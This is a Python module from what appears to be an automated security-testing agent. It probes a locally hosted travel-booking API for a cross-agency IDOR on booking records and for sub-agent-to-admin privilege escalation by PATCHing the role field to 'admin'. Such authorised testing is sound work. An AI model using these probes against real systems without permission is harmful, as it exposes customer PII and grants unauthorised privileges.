"""Access Control Executor: Cross-agency IDOR & privilege escalation."""

from __future__ import annotations

import uuid

import httpx

from agents.planner import AssertionOracle, AttackTask, CandidateFinding, HttpStepSpec
from safety.gateway import SafeAsyncClient, SafetyGateway


class IDORExecutor:
    """Tests cross-agency booking IDOR and subagent-to-admin privilege escalation."""

    name = "idor"

    def __init__(
        self,
        gateway: SafetyGateway,
        base_url: str = "http://127.0.0.1:8001",
        async_transport: httpx.AsyncBaseTransport | None = None,
    ) -> None:
        self.gateway = gateway
        self.base_url = base_url.rstrip("/")
        self._async_transport = async_transport

    async def execute(self, task: AttackTask) -> list[CandidateFinding]:
        candidates: list[CandidateFinding] = []
        path = task.canonical_path

        if "/bookings/{id}" in path and task.method == "GET":
            target_path = path.replace("{id}", "1001")
            async with SafeAsyncClient(
                self.gateway, agent="executor_idor", actor="agency_a_admin", pace=True, inner_transport=self._async_transport
            ) as alpha_client:
                base_resp = await alpha_client.get(f"{self.base_url}{target_path}")

            async with SafeAsyncClient(
                self.gateway, agent="executor_idor", actor="agency_b_admin", pace=True, inner_transport=self._async_transport
            ) as beta_client:
                exploit_resp = await beta_client.get(f"{self.base_url}{target_path}")

            if base_resp.status_code == 200 and exploit_resp.status_code == 200:
                body = exploit_resp.json()
                if body.get("agency_id") == "AGENCY_ALPHA":
                    candidates.append(
                        CandidateFinding(
                            candidate_id=f"CAND-{uuid.uuid4().hex[:8].upper()}",
                            vuln_class="Access control",
                            executor="idor",
                            canonical_endpoint=path,
                            method="GET",
                            affected_parameter="id",
                            title=f"Cross-Agency IDOR on {path}",
                            summary="Agency Beta admin accessed Agency Alpha booking and traveller PII.",
                            baseline_step=HttpStepSpec(method="GET", path=target_path, actor="agency_a_admin"),
                            exploit_step=HttpStepSpec(method="GET", path=target_path, actor="agency_b_admin"),
                            oracle=AssertionOracle(
                                oracle_type="cross_agency_leak",
                                target_field="agency_id",
                                forbidden_value="AGENCY_ALPHA",
                            ),
                        )
                    )

        if "/users/me" in path and task.method == "PATCH":
            async with SafeAsyncClient(
                self.gateway,
                agent="executor_idor",
                actor="agency_a_subagent",
                pace=True,
                inner_transport=self._async_transport,
            ) as sub_client:
                baseline = await sub_client.patch(
                    f"{self.base_url}/api/v3/users/me",
                    json={"display_name": "Sub Agent Baseline"},
                )
                self.gateway.validator.check_payload_budget("role", 1)
                exploit = await sub_client.patch(
                    f"{self.base_url}/api/v3/users/me",
                    json={"role": "admin"},
                )
            if baseline.status_code == 200 and exploit.status_code == 200:
                if exploit.json().get("role") == "admin":
                    candidates.append(
                        CandidateFinding(
                            candidate_id=f"CAND-{uuid.uuid4().hex[:8].upper()}",
                            vuln_class="Access control",
                            executor="idor",
                            canonical_endpoint=path,
                            method="PATCH",
                            affected_parameter="role",
                            title="Sub-agent to Admin Privilege Escalation via Mass Assignment",
                            summary="Sub-agent elevated own role to 'admin' via PATCH /api/v3/users/me.",
                            baseline_step=HttpStepSpec(
                                method="PATCH",
                                path="/api/v3/users/me",
                                actor="agency_a_subagent",
                                json_body={"display_name": "Sub Agent Baseline"},
                            ),
                            exploit_step=HttpStepSpec(
                                method="PATCH",
                                path="/api/v3/users/me",
                                actor="agency_a_subagent",
                                json_body={"role": "admin"},
                            ),
                            oracle=AssertionOracle(
                                oracle_type="role_escalation",
                                target_field="role",
                                forbidden_value="admin",
                            ),
                        )
                    )
        return candidates
